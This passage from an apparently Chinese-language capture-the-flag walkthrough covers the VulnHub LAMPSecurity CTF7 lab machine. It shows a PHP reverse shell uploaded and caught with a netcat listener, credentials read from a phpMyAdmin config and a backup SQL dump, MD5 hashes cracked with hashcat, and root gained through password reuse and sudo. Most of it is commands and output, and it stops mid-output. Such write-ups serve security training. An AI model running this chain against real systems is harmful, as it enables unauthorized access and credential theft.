<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>After some munal try, we find out upload file in the path of <code>192.168.56.141/assets/</code>.<br>So we upload php-reverse-shell.<br class='item-img' data-src='/pic/assets/1683104766103-c2b81916-4b5d-43e7-b28d-9d0879519b99.png'><img src="/pic/assets/1683104766103-c2b81916-4b5d-43e7-b28d-9d0879519b99.png" alt="image.png">And we curl our <code>shell.php</code></p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># curl http://192.168.56.141/assets/shell.php</span>
┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/LampSecurity/ctf7/workSpace<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> nc -lvp 443                                                           
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> kali: 
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> 443 <span class="token punctuation">..</span>.
192.168.56.141: inverse host lookup failed: Host name lookup failure
connect to <span class="token punctuation">[</span>192.168.56.132<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span>192.168.56.141<span class="token punctuation">]</span> 48031
Linux localhost.localdomain 2.6.32-279.el6.i686 <span class="token comment" spellcheck="true">#1 SMP Fri Jun 22 10:59:55 UTC 2012 i686 i686 i386 GNU/Linux</span>
 17:37:14 up  2:45,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid<span class="token operator">=</span>48<span class="token punctuation">(</span>apache<span class="token punctuation">)</span> gid<span class="token operator">=</span>48<span class="token punctuation">(</span>apache<span class="token punctuation">)</span> groups<span class="token operator">=</span>48<span class="token punctuation">(</span>apache<span class="token punctuation">)</span> context<span class="token operator">=</span>system_u:system_r:httpd_t:s0
sh: no job control <span class="token keyword">in</span> this shell
sh-4.1$ <span class="token function">whoami</span>
<span class="token function">whoami</span>
apache
sh-4.1$ <span class="token function">pwd</span>
/
<span class="token function">pwd</span>
sh-4.1$ ip a
ip a
1: lo: <span class="token operator">&lt;</span>LOOPBACK,UP,LOWER_UP<span class="token operator">></span> mtu 16436 qdisc noqueue state UNKNOWN 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth1: <span class="token operator">&lt;</span>BROADCAST,MULTICAST,UP,LOWER_UP<span class="token operator">></span> mtu 1500 qdisc pfifo_fast state UNKNOWN qlen 1000
    link/ether 00:0c:29:ac:12:e4 brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.141/24 brd 192.168.56.255 scope global eth1
    inet6 fe80::20c:29ff:feac:12e4/64 scope <span class="token function">link</span> 
       valid_lft forever preferred_lft forever
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>Sucessfully get webshell.</p>
<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>先python spwan一个更稳定的shell。<br>然后<code>sudo -l</code>需要密码，<code>find</code>suid位文件没有能用的，<code>cat /etc/crontab</code>直接没有定时任务。OK。<br>行吧，在上大招前先手工枚举一下吧。</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">uname</span> -a                                                                                     
Linux localhost.localdomain 2.6.32-279.el6.i686 <span class="token comment" spellcheck="true">#1 SMP Fri Jun 22 10:59:55 UTC 2012 i686 i686 i386 GNU/Linux </span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>版本挺低的，还是经典2.6，可以考虑内核提权。但是优先级往后稍稍吧。</p>
<h3 id="配置文件查看"><a href="#配置文件查看" class="headerlink" title="配置文件查看"></a>配置文件查看</h3><p><code>cd</code>到&#x2F;home目录下，发现很多用户，然而没有read权限，没用，查不了是否有用户遗留的登录凭证。<br>那就看看网站配置文件啥的吧，找点前后端连接用到的密码。</p>
<pre class="line-numbers language-bash"><code class="language-bash">bash-4.1$ <span class="token function">cat</span> config.inc.php
<span class="token function">cat</span> config.inc.php
<span class="token operator">&lt;</span>?php
/*
 * Generated configuration <span class="token function">file</span>
 * Generated by: phpMyAdmin 3.5.4 setup script
 * Date: Wed, 19 Dec 2012 09:01:38 -0500
 */

/* Servers configuration */
<span class="token variable">$i</span> <span class="token operator">=</span> 0<span class="token punctuation">;</span>

/* Server: localhost <span class="token punctuation">[</span>1<span class="token punctuation">]</span> */
<span class="token variable">$i</span>++<span class="token punctuation">;</span>
<span class="token variable">$cfg</span><span class="token punctuation">[</span><span class="token string">'Servers'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'verbose'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'localhost'</span><span class="token punctuation">;</span>
<span class="token variable">$cfg</span><span class="token punctuation">[</span><span class="token string">'Servers'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'localhost'</span><span class="token punctuation">;</span>
<span class="token variable">$cfg</span><span class="token punctuation">[</span><span class="token string">'Servers'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'port'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
<span class="token variable">$cfg</span><span class="token punctuation">[</span><span class="token string">'Servers'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'socket'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
<span class="token variable">$cfg</span><span class="token punctuation">[</span><span class="token string">'Servers'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'connect_type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'tcp'</span><span class="token punctuation">;</span>
<span class="token variable">$cfg</span><span class="token punctuation">[</span><span class="token string">'Servers'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'extension'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'mysqli'</span><span class="token punctuation">;</span>
<span class="token variable">$cfg</span><span class="token punctuation">[</span><span class="token string">'Servers'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'nopassword'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token variable">$cfg</span><span class="token punctuation">[</span><span class="token string">'Servers'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'auth_type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'cookie'</span><span class="token punctuation">;</span>
<span class="token variable">$cfg</span><span class="token punctuation">[</span><span class="token string">'Servers'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'root'</span><span class="token punctuation">;</span>
<span class="token variable">$cfg</span><span class="token punctuation">[</span><span class="token string">'Servers'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
<span class="token variable">$cfg</span><span class="token punctuation">[</span><span class="token string">'Servers'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'AllowNoPassword'</span><span class="token punctuation">]</span> <span class="token operator">=</span> TRUE<span class="token punctuation">;</span>
<span class="token variable">$cfg</span><span class="token punctuation">[</span><span class="token string">'Servers'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'AllowNoPasswordRoot'</span><span class="token punctuation">]</span> <span class="token operator">=</span> TRUE<span class="token punctuation">;</span> 

/* End of servers configuration */

<span class="token variable">$cfg</span><span class="token punctuation">[</span><span class="token string">'blowfish_secret'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'50d1c8ba084fd9.39888691'</span><span class="token punctuation">;</span>
<span class="token variable">$cfg</span><span class="token punctuation">[</span><span class="token string">'DefaultLang'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'en'</span><span class="token punctuation">;</span>
<span class="token variable">$cfg</span><span class="token punctuation">[</span><span class="token string">'ServerDefault'</span><span class="token punctuation">]</span> <span class="token operator">=</span> 1<span class="token punctuation">;</span>
<span class="token variable">$cfg</span><span class="token punctuation">[</span><span class="token string">'UploadDir'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
<span class="token variable">$cfg</span><span class="token punctuation">[</span><span class="token string">'SaveDir'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>从网站config文件我们可以看到，数据root用户登录直接不用密码。那我之后可以登录一下数据库找点信息。</p>
<h3 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h3><p>再手动遍历了下网页目录，发现之前进不去的&#x2F;backups目录有个备份文件。我们查看一下，刚好最后几行记录了向数据库插入用户的账号密码等信息。</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">/* /var/www/html/backups */</span>
<span class="token keyword">LOCK</span> <span class="token keyword">TABLES</span> <span class="token punctuation">`</span>users<span class="token punctuation">`</span> <span class="token keyword">WRITE</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">/*!40000 ALTER TABLE `users` DISABLE KEYS */</span><span class="token punctuation">;</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token punctuation">`</span>users<span class="token punctuation">`</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'webdev@localhost.localdomain'</span><span class="token punctuation">,</span><span class="token string">'f7aa6066f95255096672e3a5fc537081'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token string">'Developer account'</span><span class="token punctuation">,</span><span class="token string">'Developer account for updating the site.'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'brian@localhost.localdomain'</span><span class="token punctuation">,</span><span class="token string">'d41d8cd98f00b204e9800998ecf8427e'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'2012-12-19 11:30:54'</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'Brian Hershel'</span><span class="token punctuation">,</span><span class="token string">'Brian is our technical brains behind the operations and a chief trainer.'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'john@localhost.localdomain'</span><span class="token punctuation">,</span><span class="token string">'0d9ff2a4396d6939f80ffe09b1280ee1'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'John Durham'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'alice@localhost.localdomain'</span><span class="token punctuation">,</span><span class="token string">'2146bf95e8929874fc63d54f50f1d2e3'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token string">'Alice Wonder'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'ruby@localhost.localdomain'</span><span class="token punctuation">,</span><span class="token string">'9f80ec37f8313728ef3e2f218c79aa23'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token string">'Ruby Spinster'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'leon@localhost.localdomain'</span><span class="token punctuation">,</span><span class="token string">'5d93ceb70e2bf5daa84ec3d0cd2c731a'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">'Leon Parnetta'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'julia@localhost.localdomain'</span><span class="token punctuation">,</span><span class="token string">'ed2539fe892d2c52c42a440354e8e3d5'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'Julia Fields'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'michael@localhost.localdomain'</span><span class="token punctuation">,</span><span class="token string">'9c42a1346e333a770904b2a2b37fa7d3'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token string">'Michael Saint'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'bruce@localhost.localdomain'</span><span class="token punctuation">,</span><span class="token string">'3a24d81c2b9d0d9aaf2f10c6c9757d4e'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token string">'Bruce Pottricks'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'neil@localhost.localdomain'</span><span class="token punctuation">,</span><span class="token string">'4773408d5358875b3764db552a29ca61'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token string">'Neil Felstein'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'charles@localhost.localdomain'</span><span class="token punctuation">,</span><span class="token string">'b2a97bcecbd9336b98d59d9324dae5cf'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token string">'Charles Adams'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">/*!40000 ALTER TABLE `users` ENABLE KEYS */</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们提取一下登录凭证，把哈希值丢到<code>crackstation</code>。然后用得到的密码尝试直接ssh看看能不能成功登录。</p>
<pre><code>brain:&#39;&#39;#竟然是md5的空值，草。
webdev:&#39;webdev&#39;
john:&#39;transformersrule&#39;
</code></pre>
<p>试到第3个john的时候就成功了。</p>
<pre class="line-numbers language-bash"><code class="language-bash">bash-4.1$ <span class="token function">su</span> john
<span class="token function">su</span> john
Password: transformersrule

<span class="token punctuation">[</span>john@localhost backups<span class="token punctuation">]</span>$ <span class="token function">whoami</span>
<span class="token function">whoami</span>
john
<span class="token punctuation">[</span>john@localhost backups<span class="token punctuation">]</span>$ <span class="token function">sudo</span> -l
<span class="token function">sudo</span> -l
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> john: transformersrule

Matching Defaults entries <span class="token keyword">for</span> john on this host:
    requiretty, <span class="token operator">!</span>visiblepw, always_set_home, env_reset, env_keep<span class="token operator">=</span><span class="token string">"COLORS
    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS"</span>, env_keep+<span class="token operator">=</span><span class="token string">"MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE"</span>, env_keep+<span class="token operator">=</span><span class="token string">"LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES"</span>, env_keep+<span class="token operator">=</span><span class="token string">"LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE"</span>, env_keep+<span class="token operator">=</span><span class="token string">"LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY"</span>,
    secure_path<span class="token operator">=</span>/sbin\:/bin\:/usr/sbin\:/usr/bin

User john may run the following commands on this host:
    <span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> ALL
<span class="token punctuation">[</span>john@localhost backups<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token function">su</span>
<span class="token function">sudo</span> <span class="token function">su</span>
<span class="token punctuation">[</span>root@localhost backups<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># whoami</span>
<span class="token function">whoami</span>
root
<span class="token punctuation">[</span>root@localhost backups<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># ip a</span>
ip a
1: lo: <span class="token operator">&lt;</span>LOOPBACK,UP,LOWER_UP<span class="token operator">></span> mtu 16436 qdisc noqueue state UNKNOWN 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth1: <span class="token operator">&lt;</span>BROADCAST,MULTICAST,UP,LOWER_UP<span class="token operator">></span> mtu 1500 qdisc pfifo_fast state UNKNOWN qlen 1000
    link/ether 00:0c:29:ac:12:e4 brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.141/24 brd 192.168.56.255 scope global eth1
    inet6 fe80::20c:29ff:feac:12e4/64 scope <span class="token function">link</span> 
       valid_lft forever preferred_lft forever
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>直接是sudo用户组的，直接提权成功。</p>
<h3 id="密码复用"><a href="#密码复用" class="headerlink" title="密码复用"></a>密码复用</h3><p>当然，我们也可以登录mysql数据库查看用户与密码。</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">#mysql -uroot</span>
<span class="token comment" spellcheck="true">#show databases;</span>
<span class="token comment" spellcheck="true">#use users;</span>
<span class="token comment" spellcheck="true">#select * from users;</span>
mysql<span class="token operator">></span> <span class="token keyword">select</span> username<span class="token punctuation">,</span>password <span class="token keyword">from</span> users<span class="token punctuation">;</span>
<span class="token keyword">select</span> username<span class="token punctuation">,</span>password <span class="token keyword">from</span> users<span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">-------------------------------+----------------------------------+</span>
<span class="token operator">|</span> username                      <span class="token operator">|</span> password                         <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">-------------------------------+----------------------------------+</span>
<span class="token operator">|</span> brian<span class="token variable">@localhost.localdomain</span>   <span class="token operator">|</span> <span class="token number">e22f07b17f98e0d9d364584ced0e3c18</span> <span class="token operator">|</span>
<span class="token operator">|</span> john<span class="token variable">@localhost.localdomain</span>    <span class="token operator">|</span> <span class="token number">0d9ff2a4396d6939f80ffe09b1280ee1</span> <span class="token operator">|</span>
<span class="token operator">|</span> alice<span class="token variable">@localhost.localdomain</span>   <span class="token operator">|</span> <span class="token number">2146bf95e8929874fc63d54f50f1d2e3</span> <span class="token operator">|</span>
<span class="token operator">|</span> ruby<span class="token variable">@localhost.localdomain</span>    <span class="token operator">|</span> <span class="token number">9f80ec37f8313728ef3e2f218c79aa23</span> <span class="token operator">|</span>
<span class="token operator">|</span> leon<span class="token variable">@localhost.localdomain</span>    <span class="token operator">|</span> <span class="token number">5d93ceb70e2bf5daa84ec3d0cd2c731a</span> <span class="token operator">|</span>
<span class="token operator">|</span> julia<span class="token variable">@localhost.localdomain</span>   <span class="token operator">|</span> <span class="token number">ed2539fe892d2c52c42a440354e8e3d5</span> <span class="token operator">|</span>
<span class="token operator">|</span> michael<span class="token variable">@localhost.localdomain</span> <span class="token operator">|</span> <span class="token number">9c42a1346e333a770904b2a2b37fa7d3</span> <span class="token operator">|</span>
<span class="token operator">|</span> bruce<span class="token variable">@localhost.localdomain</span>   <span class="token operator">|</span> <span class="token number">3a24d81c2b9d0d9aaf2f10c6c9757d4e</span> <span class="token operator">|</span>
<span class="token operator">|</span> neil<span class="token variable">@localhost.localdomain</span>    <span class="token operator">|</span> <span class="token number">4773408d5358875b3764db552a29ca61</span> <span class="token operator">|</span>
<span class="token operator">|</span> charles<span class="token variable">@localhost.localdomain</span> <span class="token operator">|</span> <span class="token number">b2a97bcecbd9336b98d59d9324dae5cf</span> <span class="token operator">|</span>
<span class="token operator">|</span> foo<span class="token variable">@bar.com</span>                   <span class="token operator">|</span> <span class="token number">4cb9c8a8048fd02294477fcb1a41191a</span> <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">1</span><span class="token variable">@1.com</span>                       <span class="token operator">|</span> <span class="token number">c4ca4238a0b923820dcc509a6f75849b</span> <span class="token operator">|</span>
<span class="token operator">|</span> test<span class="token variable">@nowhere.com</span>              <span class="token operator">|</span> <span class="token number">098f6bcd4621d373cade4e832627b4f6</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">-------------------------------+----------------------------------+</span>
<span class="token number">13</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>将这些凭证用<code>sed</code>与<code>awk</code>处理后，将hash值直接丢到<code>hashcat</code>中破解。</p>
<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/LampSecurity/ctf7/workSpace<span class="token punctuation">]</span>
└─$ hashcat -a 0 -m 0 passhash /usr/share/wordlists/rockyou.txt 
hashcat <span class="token punctuation">(</span>v6.2.6<span class="token punctuation">)</span> starting

OpenCL API <span class="token punctuation">(</span>OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG<span class="token punctuation">)</span> - Platform <span class="token comment" spellcheck="true">#1 [The pocl project]</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
* Device <span class="token comment" spellcheck="true">#1: pthread-sandybridge-Intel(R) Core(TM) i7-6700 CPU @ 3.40GHz, 2913/5890 MB (1024 MB allocatable), 8MCU</span>

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 12 digests<span class="token punctuation">;</span> 12 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

ATTENTION<span class="token operator">!</span> Pure <span class="token punctuation">(</span>unoptimized<span class="token punctuation">)</span> backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to <span class="token function">find</span> out about the exact limits.

Watchdog: Temperature abort trigger <span class="token keyword">set</span> to 90c

Host memory required <span class="token keyword">for</span> this attack: 2 MB

Dictionary cache built:
* Filename<span class="token punctuation">..</span>: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes<span class="token punctuation">..</span><span class="token punctuation">..</span>.: 139921507
* Keyspace<span class="token punctuation">..</span>: 14344385
* Runtime<span class="token punctuation">..</span>.: 4 secs

ed2539fe892d2c52c42a440354e8e3d5:madrid                   
4cb9c8a8048fd02294477fcb1a41191a:changeme                 
5d93ceb70e2bf5daa84ec3d0cd2c731a:qwer1234                 
098f6bcd4621d373cade4e832627b4f6:test                     
b2a97bcecbd9336b98d59d9324dae5cf:chuck33                  
2146bf95e8929874fc63d54f50f1d2e3:turtles77                
9c42a1346e333a770904b2a2b37fa7d3:somepassword             
e22f07b17f98e0d9d364584ced0e3c18:my2cents                 
Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length <span class="token punctuation">(</span>usually down to 32<span class="token punctuation">)</span>.

* Append -w 3 to the commandline.
  This can cause your <span class="token function">screen</span> to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better <span class="token keyword">for</span> specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
